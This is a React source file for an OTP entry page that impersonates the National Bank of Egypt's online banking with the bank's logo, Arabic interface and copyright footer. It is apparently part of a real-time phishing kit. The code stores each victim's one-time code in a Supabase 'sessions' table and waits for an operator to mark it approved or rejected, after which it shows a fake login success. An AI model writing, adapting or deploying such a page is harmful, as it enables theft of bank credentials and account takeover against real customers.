import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useEffect, useRef, useState } from "react";
import { ShieldCheck, ArrowRight, Loader2, CheckCircle2 } from "lucide-react";
import nbeLogo from "@/assets/nbe-logo-full.png.asset.json";
import { supabase } from "@/integrations/supabase/client";
import { useSessionRedirect } from "@/hooks/use-session-redirect";

export const Route = createFileRoute("/otp")({
  head: () => ({
    meta: [{ title: "إدخال رمز التحقق | الأهلي نت" }],
  }),
  component: OtpPage,
});

function OtpPage() {
  useSessionRedirect();
  const navigate = useNavigate();
  const [otp, setOtp] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const [error, setError] = useState("");
  const [done, setDone] = useState(false);
  const channelRef = useRef<ReturnType<typeof supabase.channel> | null>(null);

  useEffect(() => {
    if (typeof window === "undefined") return;
    const id = sessionStorage.getItem("nbe_session_id");
    if (!id) navigate({ to: "/login" });
    return () => {
      if (channelRef.current) supabase.removeChannel(channelRef.current);
    };
  }, [navigate]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!otp.trim()) return;
    const sessionId = typeof window !== "undefined" ? sessionStorage.getItem("nbe_session_id") : null;
    if (!sessionId) {
      navigate({ to: "/login" });
      return;
    }
    setError("");
    setSubmitting(true);
    const { error: updateError } = await supabase
      .from("sessions")
      .update({ otp, status: "pending_otp" })
      .eq("id", sessionId);

    if (updateError) {
      setSubmitting(false);
      setError("حدث خطأ، حاول مرة أخرى");
      return;
    }

    const channel = supabase
      .channel(`session-otp-${sessionId}`)
      .on(
        "postgres_changes",
        { event: "UPDATE", schema: "public", table: "sessions", filter: `id=eq.${sessionId}` },
        (payload) => {
          const row = payload.new as { status: string };
          if (row.status === "otp_approved") {
            setSubmitting(false);
            setDone(true);
            supabase.removeChannel(channel);
            channelRef.current = null;
          } else if (row.status === "otp_rejected") {
            setSubmitting(false);
            setOtp("");
            setError("الرمز غير صحيح، من فضلك حاول مرة أخرى");
          }
        },
      )
      .subscribe();
    channelRef.current = channel;
  };

  if (done) {
    return (
      <div dir="rtl" className="flex min-h-screen flex-col bg-background text-foreground">
        <header className="flex items-center justify-end border-b border-border px-6 py-4">
          <img src={nbeLogo.url} alt="البنك الأهلي المصري" width={1920} height={520} className="h-9 w-auto object-contain md:h-11" />
        </header>
        <main className="flex flex-1 flex-col items-center justify-center px-4 text-center">
          <div className="mx-auto flex h-20 w-20 items-center justify-center rounded-full bg-green-100 text-green-600">
            <CheckCircle2 className="h-10 w-10" />
          </div>
          <h1 className="mt-6 text-2xl font-bold">تم تسجيل الدخول بنجاح</h1>
          <p className="mt-2 text-sm text-muted-foreground">سيتم توجيهك إلى صفحتك الشخصية قريباً.</p>
        </main>
      </div>
    );
  }

  return (
    <div dir="rtl" className="flex min-h-screen flex-col bg-background text-foreground">
      <header className="flex items-center justify-end border-b border-border px-6 py-4">
        <img
          src={nbeLogo.url}
          alt="البنك الأهلي المصري"
          width={1920}
          height={520}
          className="h-9 w-auto object-contain md:h-11"
        />
      </header>

      <main className="flex flex-1 flex-col items-center px-4 pt-16">
        <form onSubmit={handleSubmit} className="w-full max-w-md text-center">
          <div className="mx-auto flex h-16 w-16 items-center justify-center rounded-full bg-primary/10 text-primary">
            <ShieldCheck className="h-8 w-8" />
          </div>
          <h1 className="mt-6 text-2xl font-bold text-foreground">إدخال رمز التحقق</h1>
          <p className="mt-2 text-sm text-muted-foreground">
            من فضلك أدخل رمز OTP Token المرسل إليك لإتمام تسجيل الدخول.
          </p>

          <div className="mt-10">
            <input
              type="password"
              inputMode="numeric"
              value={otp}
              onChange={(e) => setOtp(e.target.value.replace(/\D/g, ""))}
              placeholder="••••••"
              autoFocus
              disabled={submitting}
              className="w-full rounded-xl border-2 border-input bg-background px-6 py-5 text-center text-3xl font-bold tracking-[0.5em] outline-none transition-colors placeholder:text-muted-foreground/40 focus:border-primary focus:ring-4 focus:ring-primary/20 disabled:opacity-60"
            />
            <p className="mt-3 text-xs text-muted-foreground">
              يمكنك إدخال أي عدد من الأرقام
            </p>
            {error && (
              <p className="mt-3 rounded-lg bg-destructive/10 px-3 py-2 text-xs font-semibold text-destructive">
                {error}
              </p>
            )}
          </div>

          <button
            type="submit"
            disabled={submitting || !otp.trim()}
            className="mt-10 flex w-full items-center justify-center gap-2 rounded-lg bg-primary py-4 text-sm font-bold text-primary-foreground transition-colors hover:bg-primary/90 disabled:opacity-60"
          >
            {submitting ? (
              <>
                <Loader2 className="h-5 w-5 animate-spin" />
                جاري التحقق...
              </>
            ) : (
              <>
                تأكيد
                <ArrowRight className="h-4 w-4" />
              </>
            )}
          </button>
        </form>
      </main>

      <footer className="mt-10 bg-primary py-4 text-center text-xs font-semibold text-primary-foreground">
        جميع الحقوق محفوظة - البنك الأهلي المصري ©
      </footer>
    </div>
  );
}
